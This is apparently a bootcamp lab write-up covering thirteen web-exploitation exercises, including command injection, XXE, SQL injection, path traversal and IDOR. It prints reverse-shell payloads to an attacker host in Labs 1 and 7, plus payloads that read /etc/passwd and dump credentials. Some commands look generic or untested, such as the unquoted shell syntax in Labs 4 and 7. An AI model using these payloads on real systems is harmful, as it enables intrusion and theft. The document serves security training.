# Web Application Exploitation - Day 2

## Overview
This document outlines the labs completed on 07/31/2025 during the hacking bootcamp, focusing on exploiting vulnerabilities in web applications.

## Table of Contents
- [Lab 1: OS Command Injection](#lab-1-os-command-injection)
- [Lab 2: XML External Entity](#lab-2-xml-external-entity)
- [Lab 3: SQL-Injection Union-based](#lab-3-sql-injection-union-based)
- [Lab 4: Authentication Bypass](#lab-4-authentication-bypass)
- [Lab 5: SQL-Injection - Log in Bypass](#lab-5-sql-injection-log-in-bypass)
- [Lab 6: (Advanced) Path Traversal](#lab-6-advanced-path-traversal)
- [Lab 7: (Advanced) OS Command Injection](#lab-7-advanced-os-command-injection)
- [Lab 8: Burping](#lab-8-burping)
- [Lab 9: Dirsearch](#lab-9-dirsearch)
- [Lab 10: (Advanced) Split](#lab-10-advanced-split)
- [Lab 11: Driver's Catalogue](#lab-11-drivers-catalogue)
- [Lab 12: Notes](#lab-12-notes)
- [Lab 13: Access Control - IDOR](#lab-13-access-control-idor)

## Labs

### Lab 1: OS Command Injection
#### Objective
Execute arbitrary system commands via a vulnerable web application input.

#### Vulnerabilities
- OS Command Injection: Unsanitized user input allows execution of system commands.

#### Requirements
Target web application must accept unsanitized input for command execution.

#### Steps
1. **Setup**
   - Verify connectivity to the target web application.
   ```bash
   curl http://<TARGET_IP>/command
   ```
2. **Reconnaissance**
   - Identify input fields vulnerable to command injection.
   ```bash
   curl http://<TARGET_IP>/command?input=ping+-c+1+<ATTACKER_IP>
   ```
3. **Exploitation**
   - Inject a command to spawn a reverse shell.
   ```bash
   curl http://<TARGET_IP>/command?input=whoami%3Bbash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261
   ```

#### Why It Works
Unsanitized input fields allow attackers to append malicious commands, executed by the server’s operating system.

#### Alternatives
- Use Burp Suite to test for command injection manually.

#### Resources
- [OS Command Injection Guide: https://www.owasp.org/www-community/attacks/Command_Injection](https://www.owasp.org/www-community/attacks/Command_Injection)

#### Notes
- Set up a netcat listener (`nc -lvnp 4444`) before exploitation.

---

### Lab 2: XML External Entity
#### Objective
Extract sensitive data by exploiting an XML External Entity (XXE) vulnerability.

#### Vulnerabilities
- XXE: Improper XML parsing allows access to local files or external resources.

#### Requirements
Target web application must process XML input without proper validation.

#### Steps
1. **Setup**
   - Verify the application accepts XML input.
   ```bash
   curl -X POST http://<TARGET_IP>/upload -H "Content-Type: application/xml" -d "<xml></xml>"
   ```
2. **Reconnaissance**
   - Test for XXE by injecting a basic entity.
   ```bash
   curl -X POST http://<TARGET_IP>/upload -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "test">]><root>&xxe;</root>'
   ```
3. **Exploitation**
   - Extract /etc/passwd using an XXE payload.
   ```bash
   curl -X POST http://<TARGET_IP>/upload -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
   ```

#### Why It Works
Improper XML parsing allows attackers to reference external entities, accessing sensitive files like /etc/passwd.

#### Alternatives
- Use XXE to perform SSRF or denial-of-service attacks.

#### Resources
- [OWASP XXE Guide: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

#### Notes
- Test for XXE in all XML-processing endpoints.

---

### Lab 3: SQL-Injection Union-based
#### Objective
Extract data from a database using a UNION-based SQL injection.

#### Vulnerabilities
- SQL Injection: Unsanitized input allows manipulation of SQL queries.

#### Requirements
Target web application must have a vulnerable SQL query endpoint.

#### Steps
1. **Setup**
   - Verify connectivity to the target application.
   ```bash
   curl http://<TARGET_IP>/search
   ```
2. **Reconnaissance**
   - Test for SQL injection with a UNION query.
   ```bash
   curl http://<TARGET_IP>/search?id=1+UNION+SELECT+1,2,3--
   ```
3. **Exploitation**
   - Extract database contents using UNION.
   ```bash
   curl http://<TARGET_IP>/search?id=1+UNION+SELECT+username,password+FROM+users--
   ```

#### Why It Works
Unsanitized input allows attackers to append UNION queries, retrieving data from other tables.

#### Alternatives
- Use sqlmap for automated SQL injection exploitation.

#### Resources
- [OWASP SQL Injection Guide: https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

#### Notes
- Determine the number of columns in the UNION query before exploitation.

---

### Lab 4: Authentication Bypass
#### Objective
Bypass authentication to access restricted web application resources.

#### Vulnerabilities
- Weak Authentication: Flawed logic allows bypassing login checks.

#### Requirements
Target web application must have a flawed authentication mechanism.

#### Steps
1. **Setup**
   - Verify access to the login page.
   ```bash
   curl http://<TARGET_IP>/login
   ```
2. **Reconnaissance**
   - Test for authentication bypass with manipulated parameters.
   ```bash
   curl http://<TARGET_IP>/login?username=admin&password=wrong&admin=true
   ```
3. **Exploitation**
   - Bypass authentication by exploiting parameter manipulation.
   ```bash
   curl -X POST http://<TARGET_IP>/login -d "username=guest&admin=true"
   ```

#### Why It Works
Flawed authentication logic allows attackers to manipulate parameters, granting unauthorized access.

#### Alternatives
- Use Burp Suite to intercept and modify login requests.

#### Resources
- [Authentication Bypass Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/broken-authentication](https://www.hacktricks.xyz/pentesting/pentesting-web/broken-authentication)

#### Notes
- Check for hidden parameters or cookies during reconnaissance.

---

### Lab 5: SQL-Injection - Log in Bypass
#### Objective
Bypass a login form using SQL injection to gain unauthorized access.

#### Vulnerabilities
- SQL Injection: Unsanitized login form inputs allow query manipulation.

#### Requirements
Target web application must have a vulnerable login form.

#### Steps
1. **Setup**
   - Verify access to the login page.
   ```bash
   curl http://<TARGET_IP>/login
   ```
2. **Reconnaissance**
   - Test for SQL injection in the login form.
   ```bash
   curl -X POST http://<TARGET_IP>/login -d "username=admin'--&password=wrong"
   ```
3. **Exploitation**
   - Bypass login with a crafted SQL payload.
   ```bash
   curl -X POST http://<TARGET_IP>/login -d "username=admin'+OR+1=1--&password=wrong"
   ```

#### Why It Works
Unsanitized input in the login query allows attackers to craft conditions that always evaluate to true, bypassing authentication.

#### Alternatives
- Use sqlmap to automate login bypass.

#### Resources
- [SQL Injection Login Bypass: https://www.hacktricks.xyz/pentesting/pentesting-web/sql-injection](https://www.hacktricks.xyz/pentesting/pentesting-web/sql-injection)

#### Notes
- Test for both username and password field vulnerabilities.

---

### Lab 6: (Advanced) Path Traversal
#### Objective
Access restricted files on the server using advanced path traversal techniques.

#### Vulnerabilities
- Path Traversal: Improper input validation allows access to files outside the web root.

#### Requirements
Target web application must have a vulnerable file access endpoint.

#### Steps
1. **Setup**
   - Verify connectivity to the target application.
   ```bash
   curl http://<TARGET_IP>/file
   ```
2. **Reconnaissance**
   - Test for path traversal with basic payloads.
   ```bash
   curl http://<TARGET_IP>/file?path=../../etc/passwd
   ```
3. **Exploitation**
   - Access sensitive files using encoded or complex payloads.
   ```bash
   curl http://<TARGET_IP>/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
   ```

#### Why It Works
Improper sanitization of file paths allows attackers to traverse directories and access sensitive files.

#### Alternatives
- Use Burp Suite to encode and test traversal payloads.

#### Resources
- [Path Traversal Guide: https://owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

#### Notes
- Test for URL encoding and filter evasion techniques.

---

### Lab 7: (Advanced) OS Command Injection
#### Objective
Execute system commands via a complex command injection vulnerability.

#### Vulnerabilities
- Advanced Command Injection: Bypassing filters to execute commands.

#### Requirements
Target web application must have a filtered command execution endpoint.

#### Steps
1. **Setup**
   - Verify connectivity to the target application.
   ```bash
   curl http://<TARGET_IP>/exec
   ```
2. **Reconnaissance**
   - Test for command injection with filter evasion.
   ```bash
   curl http://<TARGET_IP>/exec?cmd=whoami%3B%3Bid
   ```
3. **Exploitation**
   - Inject a command to spawn a reverse shell, bypassing filters.
   ```bash
   curl http://<TARGET_IP>/exec?cmd=$(bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261')
   ```

#### Why It Works
Complex payloads bypass input filters, allowing arbitrary command execution on the server.

#### Alternatives
- Use Metasploit’s command injection module for automation.

#### Resources
- [Advanced Command Injection: https://www.hacktricks.xyz/pentesting/pentesting-web/command-injection](https://www.hacktricks.xyz/pentesting/pentesting-web/command-injection)

#### Notes
- Test multiple filter evasion techniques (e.g., spaces, semicolons, $()).

---

### Lab 8: Burping
#### Objective
Use Burp Suite to identify and exploit web application vulnerabilities.

#### Vulnerabilities
- Multiple Vulnerabilities: Burp Suite reveals issues like XSS, SQLi, or misconfigurations.

#### Requirements
Target web application must be accessible, and Burp Suite must be configured.

#### Steps
1. **Setup**
   - Configure Burp Suite proxy and browser.
   ```bash
   # Set browser proxy to 127.0.0.1:8080
   ```
2. **Reconnaissance**
   - Crawl the target application with Burp Spider.
   ```bash
   # Use Burp Suite GUI to initiate crawl
   ```
3. **Exploitation**
   - Test for vulnerabilities using Burp Intruder or Scanner.
   ```bash
   # Use Burp Intruder to fuzz input parameters
   ```

#### Why It Works
Burp Suite intercepts and manipulates HTTP requests, revealing and exploiting vulnerabilities in web applications.

#### Alternatives
- Use OWASP ZAP for similar web vulnerability scanning.

#### Resources
- [Burp Suite Guide: https://portswigger.net/burp/documentation](https://portswigger.net/burp/documentation)

#### Notes
- Ensure Burp Suite is configured to intercept HTTPS traffic.

---

### Lab 9: Dirsearch
#### Objective
Discover hidden directories and files on a web server using dirsearch.

#### Vulnerabilities
- Hidden Resources: Exposed directories or files reveal sensitive information.

#### Requirements
Target web server must be accessible for directory enumeration.

#### Steps
1. **Setup**
   - Verify connectivity to the target web server.
   ```bash
   curl http://<TARGET_IP>
   ```
2. **Reconnaissance**
   - Run dirsearch to enumerate directories and files.
   ```bash
   dirsearch -u http://<TARGET_IP> -e php,html,txt
   ```
3. **Exploitation**
   - Access discovered sensitive files (e.g., admin panel).
   ```bash
   curl http://<TARGET_IP>/admin
   ```

#### Why It Works
Dirsearch identifies hidden or misconfigured directories, exposing sensitive resources for exploitation.

#### Alternatives
- Use gobuster or wfuzz for directory brute-forcing.

#### Resources
- [Dirsearch Documentation: https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

#### Notes
- Use a comprehensive wordlist for effective enumeration.

---

### Lab 10: (Advanced) Split
#### Objective
Exploit a web application by leveraging split vulnerabilities in input handling.

#### Vulnerabilities
- Input Splitting: Improper handling of input delimiters allows command or query manipulation.

#### Requirements
Target web application must process input with vulnerable delimiters.

#### Steps
1. **Setup**
   - Verify connectivity to the target application.
   ```bash
   curl http://<TARGET_IP>/process
   ```
2. **Reconnaissance**
   - Test for input splitting vulnerabilities.
   ```bash
   curl http://<TARGET_IP>/process?input=value|id
   ```
3. **Exploitation**
   - Inject a command via split delimiter.
   ```bash
   curl http://<TARGET_IP>/process?input=value$(whoami)
   ```

#### Why It Works
Improper delimiter handling allows attackers to inject commands or queries, bypassing input validation.

#### Alternatives
- Use Burp Suite to test delimiter variations.

#### Resources
- [Command Injection Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/command-injection](https://www.hacktricks.xyz/pentesting/pentesting-web/command-injection)

#### Notes
- Test multiple delimiters (e.g., |, ;, $()) for splitting vulnerabilities.

---

### Lab 11: Driver's Catalogue
#### Objective
Exploit a vulnerable driver catalogue application to access unauthorized data.

#### Vulnerabilities
- Misconfigured Access: Weak input validation exposes sensitive driver data.

#### Requirements
Target driver catalogue web application must be accessible.

#### Steps
1. **Setup**
   - Verify access to the catalogue application.
   ```bash
   curl http://<TARGET_IP>/catalogue
   ```
2. **Reconnaissance**
   - Enumerate endpoints for data exposure.
   ```bash
   curl http://<TARGET_IP>/catalogue/drivers
   ```
3. **Exploitation**
   - Access unauthorized driver data via parameter manipulation.
   ```bash
   curl http://<TARGET_IP>/catalogue/driver?id=1
   ```

#### Why It Works
Weak input validation allows attackers to access sensitive data by manipulating parameters.

#### Alternatives
- Use Burp Suite to enumerate hidden endpoints.

#### Resources
- [Web Application Testing Guide: https://www.hacktricks.xyz/pentesting/pentesting-web](https://www.hacktricks.xyz/pentesting/pentesting-web)

#### Notes
- Check for exposed APIs or JSON endpoints in the catalogue.

---

### Lab 12: Notes
#### Objective
Exploit a notes application to access unauthorized user notes.

#### Vulnerabilities
- Insecure Note Access: Lack of access controls allows unauthorized note retrieval.

#### Requirements
Target notes web application must be accessible with user credentials.

#### Steps
1. **Setup**
   - Verify access to the notes application.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/notes
   ```
2. **Reconnaissance**
   - Test for note ID enumeration.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/notes?id=1
   ```
3. **Exploitation**
   - Access another user’s notes by changing the ID.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/notes?id=2
   ```

#### Why It Works
Lack of access controls allows attackers to retrieve notes by manipulating note IDs.

#### Alternatives
- Use Burp Intruder to automate ID enumeration.

#### Resources
- [Insecure Direct Object References: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)

#### Notes
- Capture a valid session cookie before testing.

---

### Lab 13: Access Control - IDOR
#### Objective
Access unauthorized resources by exploiting Insecure Direct Object Reference (IDOR).

#### Vulnerabilities
- IDOR: Lack of access controls allows manipulation of object IDs to access restricted data.

#### Requirements
Target web application must have a vulnerable resource access endpoint.

#### Steps
1. **Setup**
   - Verify access to the target application.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/profile
   ```
2. **Reconnaissance**
   - Test for IDOR by changing resource IDs.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/profile?id=1
   ```
3. **Exploitation**
   - Access another user’s profile by modifying the ID.
   ```bash
   curl -b "session=<SESSION_COOKIE>" http://<TARGET_IP>/profile?id=2
   ```

#### Why It Works
Insecure Direct Object References allow attackers to access unauthorized resources by manipulating IDs.

#### Alternatives
- Use Burp Intruder to automate IDOR testing.

#### Resources
- [OWASP IDOR Guide: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)

#### Notes
- Ensure a valid session cookie is used during testing.

---